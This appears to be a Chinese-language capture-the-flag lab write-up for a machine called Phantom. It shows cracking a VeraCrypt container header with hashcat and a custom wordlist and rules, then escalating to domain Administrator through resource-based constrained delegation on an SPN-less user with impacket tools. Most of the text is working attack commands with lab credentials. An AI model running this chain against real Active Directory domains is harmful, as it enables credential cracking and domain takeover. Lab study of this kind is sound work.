我通过Google搜索：Veracrypt hc file decrypt password，获取到以下一个教程视频来破解这个加密文件

https://www.youtube.com/watch?v=6CqT96d4-8Y

```
dd if=IT_BACKUP_201123.hc of=backuphash.tc bs=512 count=1
```

我们获取到了一个hash，下一步我们需要进行相应的破解，默认的加密方式为AES/SHA512 (legacy)，hashcat的编号为13721，根据wiki的提示，我们需要创建一个适用的规则和字典

```
cat phantom.txt
phantom
Phantom
PHANTOM
PHANT0M
phant0m
phantom.vl
PHANTOM.VL
phant0m.vl
PHANT0M.vl
Ph4nt0m
PH4NT0M

cat phantom.rule
$2 $0 $2 $3 $$
$2 $0 $2 $3 $&
$2 $0 $2 $3 $@
$2 $0 $2 $3 $!
$2 $0 $2 $3 $#
$2 $0 $2 $3 $%
$2 $0 $2 $3 $^
$2 $0 $2 $3 $*
$2 $0 $2 $3 $(
$2 $0 $2 $3 $)
$2 $0 $2 $3 $-
$2 $0 $2 $3 $_
$2 $0 $2 $3 $=
$2 $0 $2 $3 $+
```

```
.\hashcat.exe -a 0 -m 13721 .\hash\backuphash.tc .\hash\phantom.txt -r .\hash\phantom.rule --backend-ignore-opencl
```

密码是修改成功了，但我们无法登录目标服务器使用对应权限

![image-20241225175548792](https://s2.loli.net/2024/12/25/d9Pziq6xWV8kuyX.png)

我们通过Google搜素哦addallowedtoact，找到了这个链接https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd#rbcd-on-spn-less-users

第一步我们先通过rbcd脚本进行域用户的凭证写入

```
sudo apt-get install --only-upgrade impacket-scripts
 
impacket-rbcd -delegate-from 'wsilva' -delegate-to 'DC$' -dc-ip '10.10.109.205' -action 'write' 'phantom.vl'/'wsilva':'Password123!'
```

![image-20241225181014988](https://s2.loli.net/2024/12/25/WqwR2eMAkFUsLj6.png)

第二步我们开始执行RBCD on SPN-less users

```
impacket-getTGT -hashes  :$(pypykatz crypto nt 'Password123!') 'phantom.vl'/'wsilva'
impacket-getTGT -hashes  :2B576ACBE6BCFDA7294D6BD18041B8FE  'phantom.vl'/'wsilva'

impacket-describeTicket 'wsilva.ccache' | grep 'Ticket Session Key'

python3 smbpasswd.py -newhashes :d651848211c51df0c0887bdf2f30347f 'phantom.vl'/'wsilva':'Password123!'@'dc.phantom.vl'
( kali版本的impacket-scripts不附带这个工具，需要我们自己下载老版本的python脚本)

export KRB5CCNAME=wsilva.ccache

impacket-getST -u2u -impersonate Administrator -spn 'cifs/dc.phantom.vl' -k -no-pass phantom.vl/'wsilva'

export KRB5CCNAME=Administrator@cifs_dc.phantom.vl@PHANTOM.VL.ccache
```
